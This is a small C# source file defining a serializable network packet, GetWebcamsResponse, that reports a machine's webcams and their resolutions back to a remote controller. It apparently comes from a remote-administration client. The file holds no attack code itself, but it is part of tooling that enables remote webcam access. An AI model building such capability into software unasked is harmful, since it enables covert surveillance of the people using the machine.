using System;
using System.Collections.Generic;
using xClient.Core.Networking;
using System.Drawing;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetWebcamsResponse : IPacket
    {
        public Dictionary<string, List<Size>> Webcams { get; set; }

        public GetWebcamsResponse()
        {
        }

        public GetWebcamsResponse(Dictionary<string, List<Size>> webcams)
        {
            this.Webcams = webcams;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}